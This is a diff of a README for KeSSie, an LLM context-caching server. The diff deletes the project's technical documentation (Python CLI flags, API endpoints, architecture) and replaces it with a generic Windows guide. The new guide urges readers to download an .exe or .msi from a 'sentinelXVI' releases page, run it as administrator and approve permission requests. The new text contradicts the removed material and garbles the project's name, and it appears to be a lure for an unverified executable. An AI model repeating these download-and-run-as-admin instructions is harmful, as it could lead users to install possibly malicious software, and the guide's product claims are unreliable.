@@ -1,420 +1,118 @@
-# KeSSie
+# 🧠 KeSSie - Smart Memory for Large Language Models
 
-[![License: KeSSie v1.2](https://img.shields.io/badge/License-KeSSie--Source--Available-blue.svg)](./LICENSE)
-[![Commercial License](https://img.shields.io/badge/Commercial-Inquire-orange.svg)](./COMMERCIAL.md)
-[![CLA Required](https://img.shields.io/badge/CLA-Required-yellow.svg)](./CONTRIBUTING.md)
+[![Download KeSSie](https://img.shields.io/badge/Download-KeSSie-brightgreen?style=for-the-badge)](https://github.com/sentinelXVI/KeSSie/releases)
 
+---
 
-## Optimized Technical Summary
+KeSSie helps manage large language models by improving how they recall information. It makes the process smooth and efficient for software that uses AI to understand and generate text. This guide shows you how to download and use KeSSie on a Windows computer.
 
-KeSSie provides a high-density **linear state engine** designed to optimize **LLM inference** by breaking the $O(n)$ memory bottleneck of the **KV cache**. Unlike traditional **long-context** methods that rely on lossy compression or RAG, KeSSie implements a **lossless linear serialization** framework. 
+## 🔍 What is KeSSie?
 
-By offloading context to a **state-management** layer, KeSSie enables models to maintain **100M+ tokens** of persistent history with a fixed memory footprint, effectively turning standard consumer GPUs into enterprise-grade **large language model** infrastructure.
+KeSSie stands for **HUGE Context Semantic recall for Large Language Models**. It helps large AI engines remember important details while they work so they don’t lose track of the context.
 
-## Lossless Linear Serialization
+Large Language Models (LLMs) like chatbots and AI assistants use big chunks of data to understand what people say. KeSSie makes this process faster and uses less memory. This helps tools respond well even when working with lots of information or in real-time.
 
-KeSSie diverges from traditional context management methods such as lossy compression (summarization) or retrieval-augmented generation (RAG). It implements a Lossless Linear Serialization framework.
+## ⚙ System Requirements
 
-### Event-Based State Materialization
-KeSSie maintains conversation history in a high-density Linear State Array rather than keeping the full KV cache in active memory.
+Before installing, check that your computer meets these basic needs:
 
-* Footprint: Approximately 4 bytes per token. 100M tokens utilize less than 400MB of system RAM.
-* The Materialization Event: Upon a semantic trigger during inference, KeSSie executes a lossless materialization event. The specific KV-state required is re-inflated into the active GPU window. This singular event is faster than standard tool-call latencies.
-* Fidelity: The model accesses historical data with bit-perfect clarity. This eliminates summarization artifacts and removes the quadratic compute overhead associated with processing massive context windows.
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel i5 or AMD Ryzen 5 (or better)
+- **RAM:** At least 8 GB (16 GB recommended)
+- **Graphics Card:** NVIDIA GPU with CUDA support or AMD with ROCm drivers for better performance
+- **Disk Space:** Minimum 500 MB free space
+- **Internet:** Required for downloading and optional updates
 
-## Quick Start
+## 🌟 Features You Should Know
 
-```bash
-# Single model, 4 GPUs, 10M token conversations, 4 simultaneous users
-python kessie_exp3.py serve \
-  --model ./qwen_VL_32B \
-  --backend vllm \
-  --gpus 4 \
-  --window 131072 \
-  --kv-cache-dtype fp8_e5m2 \
-  --kessie-cache-size 10000000 \
-  --conversation-threads 4 \
-  --conversation-queue 64 \
-  --port 8200
-```
+- **Context Window Management:** Keeps track of long conversations or texts.
+- **Memory-Saving:** Uses smart compression to reduce memory use.
+- **Fast Processing:** Optimized for real-time AI applications.
+- **GPU Support:** Runs well with both NVIDIA CUDA and AMD ROCm.
+- **Lossless Data Handling:** Ensures no information is lost during processing.
+- **Easy Integration:** Works alongside popular transformer-based AI tools.
 
-## Core Parameters
+## 🚀 Getting Started: Downloading KeSSie
 
-### Model Configuration
+To get KeSSie on your Windows computer, you need to download the software first.
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--model` | `Qwen/Qwen3-0.6B` | Model path or HuggingFace name |
-| `--backend` | `hf` | `hf` (HuggingFace) or `vllm` (recommended for production) |
-| `--gpus` | `4` | Number of GPUs for tensor parallelism |
-| `--dtype` | `bfloat16` | Model dtype |
-| `--window` | `4096` | Model context window size. **Set this to the model's max context length** (e.g. 131072 for Qwen2.5-VL-32B) |
-| `--max-generation` | `4096` | Max tokens per response |
-| `--max-model-len` | auto | vLLM max model length override |
-| `--kv-cache-dtype` | auto | KV cache dtype: `fp8_e5m2`, `fp8_e4m3fn`, `float16` |
-
-### KeSSie Cache (The Key Parameters)
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--kessie-cache-size` | `10000000` | **Max tokens per conversation cache.** This is the effective context window clients see. Each conversation independently stores up to this many tokens of history with semantic indexing for recall. |
-| `--window` | `4096` | **The model's actual context window.** Must match `--max-model-len`. KeSSie manages the gap between `--window` and `--kessie-cache-size` through fog-of-war attention and semantic recall. |
-
-**The relationship:** `--window` is what the GPU sees per inference. `--kessie-cache-size` is what the conversation remembers. KeSSie bridges them.
-
-```
-Client sees:     |<---- kessie-cache-size (10M tokens) ---->|
-Model sees:      |<-- window (131K) -->|
-KeSSie manages:  |<--- fog zone --->|<-- clear zone -->|
-                 recalled on demand    active attention
-```
-
-### Concurrency & Multi-Tenancy
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--conversation-threads` | `4` | **Max simultaneous active conversations.** Each thread holds one conversation's generation. Set based on GPU memory  -  each active conversation consumes `--window` worth of KV cache. |
-| `--conversation-queue` | `64` | **Max queued conversations** waiting for a thread. Requests beyond threads+queue get HTTP 503. |
-
-**Eviction model:** Caches are evicted on explicit close (`POST /v1/conversations/end`). If inference is running, close waits for it to finish. When the last conversation ends, all memory is freed via `gc.collect()`. There is no idle timeout  -  the client owns the lifecycle.
-
-**Client contract:** On reconnect (after eviction or server restart), the client resends conversation history. The `/v1/models` endpoint announces `max_model_len` = `kessie-cache-size`, so the client knows how much history to retain and resend.
-
-```bash
-# Client discovers effective context window
-curl http://localhost:8200/v1/models
-# Returns: {"data": [{"max_model_len": 10000000, "window": 131072, ...}]}
-# Client stores up to 10M tokens of history, resends on reconnect
-```
-
-**Memory planning:**
-```
-Active GPU memory ~ conversation-threads x window x kv_per_token x layers
-Active CPU memory ~ conversation-threads x kessie-cache-size x 4 bytes (token store)
-                   + conversation-threads x (kessie-cache-size/128) x 1KB (index)
-```
-
-**Example: 4 threads, 10M cache, 131K window, 32B model:**
-- GPU: 4 x 131K KV windows + model weights
-- CPU per conversation: ~38MB tokens + ~76MB index = ~114MB
-- CPU total: 4 x 114MB = ~456MB active (freed on conversation end)
-
-### Fog-of-War
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--fog-alpha` | `0.5` | Fog decay strength. Higher = more aggressive fogging of old context. 0 = disabled. |
-
-## API
-
-### Chat Completions (OpenAI-compatible)
-
-```bash
-curl -X POST http://localhost:8200/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [{"role": "user", "content": "Hello"}],
-    "conversation_id": "user-123-session-abc",
-    "stream": true
-  }'
-```
-
-**`conversation_id`** (optional, default: `"default"`): Routes to an isolated KeSSie cache. Same ID = same conversation history. Different IDs = fully isolated contexts.
-
-The client is responsible for:
-- Generating unique `conversation_id` per conversation session
-- Ending conversations when done (frees memory)
-- Refilling context if a cache was evicted (idle timeout or server restart)
-
-### End Conversation
-
-```bash
-curl -X POST http://localhost:8200/v1/conversations/end \
-  -H "Content-Type: application/json" \
-  -d '{"conversation_id": "user-123-session-abc"}'
-```
-
-Immediately evicts the cache. When all conversations end, all memory is freed.
-
-### List Active Conversations
-
-```bash
-curl -X POST http://localhost:8200/v1/conversations/list
-```
-
-Returns:
-```json
-{
-  "conversations": [
-    {
-      "conversation_id": "user-123-session-abc",
-      "tokens": 4521000,
-      "turns": 847,
-      "index_entries": 35320,
-      "idle_seconds": 12.3
-    }
-  ],
-  "stats": {
-    "active_conversations": 1,
-    "max_threads": 4,
-    "max_queue": 64,
-    "cache_size_per_conversation": 10000000,
-    "total_conversations": 15,
-    "total_evictions": 14,
-    "cache_hits": 230,
-    "cache_misses": 15,
-    "active_tokens": 4521000,
-    "active_index_entries": 35320,
-    "active_memory_mb": 45.2
-  }
-}
-```
-
-### Health Check
-
-```bash
-curl http://localhost:8200/health
-```
-
-Includes conversation manager stats, cache stats, knowledge store counts, and FAISS index status.
-
-## Cache Lifecycle
-
-```
-Client queries /v1/models
-    - Gets max_model_len (= kessie-cache-size)
-    - Client knows how much history to retain locally
-
-Client connects with conversation_id
-    - ConversationManager.acquire()
-    - New cache created (cache miss) or existing cache reused (cache hit)
-    - Per-conversation lock acquired (prevents eviction during inference)
-    - Thread semaphore acquired (blocks if all threads busy, queues up)
-    
-Generation runs
-    - Engine uses this conversation's KeSSieCache
-    - Tokens appended to cache, index updated
-    - Pre-gen and mid-gen recall search THIS conversation's history
-    
-Generation completes
-    - Per-conversation lock released
-    - ConversationManager.release()
-    - Thread slot freed, next queued request proceeds
-    - Cache stays in memory for next request
-    
-Client ends conversation
-    - POST /v1/conversations/end
-    - Waits for any active inference to finish (per-conv lock)
-    - full_reset(): conversation tokens, index, KV cache all freed
-    - When last conversation ends: gc.collect(), zero memory held
-    
-Client reconnects (after eviction or restart)
-    - Sends full conversation history (up to max_model_len tokens)
-    - KeSSie parses into KV cache + conversation store + semantic index
-    - Conversation resumes from where it left off
-```
-
-## Production Configurations
-
-### Small (1 GPU, personal use)
-```bash
-python kessie_exp3.py serve \
-  --model ./model --backend vllm --gpus 1 \
-  --window 32768 \
-  --kessie-cache-size 1000000 \
-  --conversation-threads 1 \
-  --conversation-queue 4
-```
-
-### Medium (4 GPUs, team of 4)
-```bash
-python kessie_exp3.py serve \
-  --model ./model --backend vllm --gpus 4 \
-  --window 131072 --kv-cache-dtype fp8_e5m2 \
-  --kessie-cache-size 10000000 \
-  --conversation-threads 4 \
-  --conversation-queue 16
-```
-
-### Large (8 GPUs, multi-user service)
-```bash
-python kessie_exp3.py serve \
-  --model ./model --backend vllm --gpus 8 \
-  --window 131072 --kv-cache-dtype fp8_e5m2 \
-  --gpu-memory-utilization 0.92 \
-  --kessie-cache-size 50000000 \
-  --conversation-threads 8 \
-  --conversation-queue 128
-```
-
-## Architecture
-
-```mermaid
-graph TB
-    subgraph Clients
-        C1[Client A<br/>conversation_id: abc]
-        C2[Client B<br/>conversation_id: def]
-        C3[Client C<br/>conversation_id: ghi]
-        CQ[Client D<br/>queued]
-    end
-
-    subgraph Server["KeSSie Server"]
-        direction TB
-        API["/v1/chat/completions<br/>/v1/conversations/end<br/>/v1/conversations/list"]
-
-        subgraph ConvMgr["ConversationManager"]
-            direction LR
-            TS["Thread Semaphore<br/>(--conversation-threads)"]
-            QS["Queue Semaphore<br/>(--conversation-queue)"]
-        end
-
-        subgraph Caches["Per-Conversation Caches"]
-            direction TB
-            subgraph Cache1["Cache: abc"]
-                CT1["Conversation Tokens<br/>up to --kessie-cache-size"]
-                IX1["Semantic Index<br/>embedding per 128 tokens"]
-                TB1["Turn Boundaries<br/>role + position"]
-            end
-            subgraph Cache2["Cache: def"]
-                CT2["Conversation Tokens"]
-                IX2["Semantic Index"]
-                TB2["Turn Boundaries"]
-            end
-        end
-
-        subgraph Engine["LibrarianEngine"]
-            direction TB
-            BP["_build_prompt()<br/>fog windowing"]
-
-            subgraph Recall["Recall Pipeline"]
-                direction LR
-                AR["_auto_recall()<br/>pre-gen search"]
-                MR["_mid_gen_recall()<br/>hedge detection"]
-            end
-
-            subgraph Gen["Generation"]
-                direction TB
-                VLLM["vLLM / HF Backend<br/>--window context"]
-                FOG["Fog-of-War Attention<br/>clear zone + fog zone"]
-            end
-
-            RB["_rebuild_prompt_with_recall()<br/>abort + inject + resume"]
-        end
-
-        KS["KnowledgeStore<br/>FAISS + SQLite"]
-    end
-
-    subgraph GPU["GPU (--gpus)"]
-        MW["Model Weights"]
-        KV["KV Cache<br/>--window tokens<br/>--kv-cache-dtype"]
-    end
-
-    subgraph CPU["CPU RAM"]
-        TS2["Token Stores<br/>~38MB per 10M tokens"]
-        IDX["Embedding Index<br/>~76MB per 10M tokens"]
-    end
-
-    C1 & C2 & C3 --> API
-    CQ -.->|queued| API
-    API --> ConvMgr
-    ConvMgr -->|acquire/release| Caches
-    Caches --> Engine
-    Engine --> VLLM
-    AR -->|search fog zone| Caches
-    MR -->|search fog zone| Caches
-    MR -->|hedge detected| RB
-    RB -->|re-submit| VLLM
-    VLLM --> GPU
-    CT1 & CT2 --> CPU
-    IX1 & IX2 --> CPU
-    Engine --> KS
-
-    style Cache1 fill:#1a3a1a,stroke:#4a4
-    style Cache2 fill:#1a1a3a,stroke:#44a
-    style GPU fill:#3a1a1a,stroke:#a44
-    style Recall fill:#3a3a1a,stroke:#aa4
-```
-
-### Request Flow
-
-```mermaid
-sequenceDiagram
-    participant C as Client
-    participant S as Server API
-    participant CM as ConversationManager
-    participant E as Engine
-    participant V as vLLM
-
-    C->>S: POST /v1/chat/completions<br/>{conversation_id, messages}
-    S->>CM: acquire(conv_id)
-    CM-->>S: KeSSieCache (new or existing)
-
-    S->>E: generate_stream(messages)
-    E->>E: _auto_recall(user_query)
-    Note over E: Search fog zone<br/>for relevant context
-
-    alt Pre-gen recall hit
-        E->>E: Inject recalled context into prompt
-    end
-
-    E->>V: Submit prompt (--window tokens)
-    V-->>E: Stream tokens
-
-    alt Model hedges during generation
-        E->>E: _check_uncertainty() fires
-        E->>E: _mid_gen_recall(generated_text)
-        E->>V: Abort current request
-        E->>E: _rebuild_prompt_with_recall()
-        E->>V: Re-submit with recalled context
-        V-->>E: Resume streaming
-    end
-
-    E-->>S: Full response
-    S->>CM: release(conv_id)
-    S-->>C: Response (SSE or JSON)
-
-    Note over C,CM: Later...
-
-    C->>S: POST /v1/conversations/end
-    S->>CM: end_conversation(conv_id)
-    CM->>CM: Wait for inference lock
-    CM->>CM: full_reset() - free all memory
-    S-->>C: {status: ended}
-```
-
-## How It Works
-
-1. **Client sends messages** with a `conversation_id`. KeSSie routes to that conversation's isolated cache.
-
-2. **Context window management**: Messages are tokenized and stored in the KeSSie cache (up to `--kessie-cache-size`). Only the most recent `--window` tokens go to the GPU. Older tokens enter the "fog zone"  -  still in the cache, semantically indexed, but not in active attention.
-
-3. **Pre-generation recall**: Before inference, KeSSie searches the fog zone for context relevant to the user's query. Found context is injected into the prompt as a system message with positional annotation (turn number, token distance).
-
-4. **Mid-generation recall**: During streaming, if the model shows uncertainty (hedging phrases like "if I recall", "let me see if I can remember"), KeSSie pauses generation, searches the fog zone with the generated text as query, injects the recalled context, and resumes. The model continues with the correct information.
-
-5. **Cache eviction**: When a conversation ends or goes idle, its entire cache is freed. When no conversations are active, all memory is released. Clients refill context on reconnect.
-
-## Environment Variables
-
-```bash
-# GPU selection
-HIP_VISIBLE_DEVICES=0,1,2,3   # AMD
-CUDA_VISIBLE_DEVICES=0,1,2,3  # NVIDIA
-```
-
-## CLI Mode
-
-For single-user interactive use:
-```bash
-python kessie_exp3.py chat \
-  --model ./model --backend vllm --gpus 4 \
-  --window 131072 --kessie-cache-size 10000000
-```
-
-Commands: `/topics`, `/store <topic> <key> <value>`, `/search <query>`, `/stats`, `/quit`
-
-## Source-Available? Why not GPL or other truly open license?
-We chose a Source Available model because we believe in transparency and community peer-review, but we also believe that developers should be compensated when their inventions power commercial products. This license allows us to keep the code public while ensuring the project's longevity.
+### How to Download
 
+1. Open your web browser and go to this page:  
+   [https://github.com/sentinelXVI/KeSSie/releases](https://github.com/sentinelXVI/KeSSie/releases)  
+   (You can also click the green **Download KeSSie** badge at the top.)
 
+2. On the releases page, look for the latest version of KeSSie.
 
+3. Find the Windows installer file. This will usually end with `.exe` or `.msi`.
+
+4. Click the file name to start the download.
+
+5. Once downloaded, go to your **Downloads** folder and double-click the file to open it.
+
+## 💻 Installing KeSSie on Windows
+
+Follow these steps to install KeSSie safely and correctly.
+
+1. When the installer opens, a welcome screen appears. Click **Next** to continue.
+
+2. Read through the license agreement. Accept by selecting **I Agree** or **Accept**, then click **Next**.
+
+3. Choose where to install KeSSie. The default folder is fine for most users. Click **Next**.
+
+4. Choose to create a desktop shortcut if you want quick access. Then click **Install**.
+
+5. Wait for the installation to finish. This may take a few minutes.
+
+6. Click **Finish** once the process ends.
+
+## ▶️ Running KeSSie for the First Time
+
+To start KeSSie:
+
+- Double-click the desktop icon you created during install, or
+- Open the Start menu, type **KeSSie**, and press Enter.
+
+The first time you run it, KeSSie may ask for permission to access your GPU or other system features. Approve these requests to get full performance.
+
+## 🔧 Basic Setup and Use
+
+KeSSie does not require complex setup for basic use. It works behind the scenes to improve memory and recall when AI programs are running.
+
+If you want to adjust settings:
+
+1. Open KeSSie.
+2. Find the **Settings** or **Options** menu.
+3. Here you can change how much memory to allocate or enable specific GPU features if your device supports it.
+4. Save changes and restart the program to apply them.
+
+## 📁 Where to Find Updates and Help
+
+### Updating KeSSie
+
+Visit the [KeSSie releases page](https://github.com/sentinelXVI/KeSSie/releases) regularly. Download and install new versions as they come out to get the latest improvements and fixes.
+
+### Getting Help
+
+- Check the **Issues** tab on the GitHub page for known problems or to report bugs.
+- Read documentation or FAQs included on the GitHub site.
+- Join relevant forums or communities if you want to ask questions or learn more about using KeSSie with large language models.
+
+## 🛠 Troubleshooting Common Problems
+
+- **Installer won’t run:** Make sure you have administrator rights on your PC. Right-click the installer and select **Run as administrator**.
+- **KeSSie won’t start:** Check that your Windows version matches the requirements. Restart your computer and try again.
+- **Performance is slow:** Confirm you have the recommended GPU drivers installed. Close background apps to free more memory.
+- **Updates don’t install:** Delete all temporary files, and download a fresh copy of the installer.
+
+## 🔗 Quick Reference: Important Links
+
+- Download or update KeSSie here:  
+  [https://github.com/sentinelXVI/KeSSie/releases](https://github.com/sentinelXVI/KeSSie/releases)
+
+- Report issues or find documentation:  
+  [https://github.com/sentinelXVI/KeSSie/issues](https://github.com/sentinelXVI/KeSSie/issues)
+
+---
+
+This guide covers downloading, installing, and using KeSSie on Windows. For other operating systems or advanced use, check the GitHub repository or community resources.
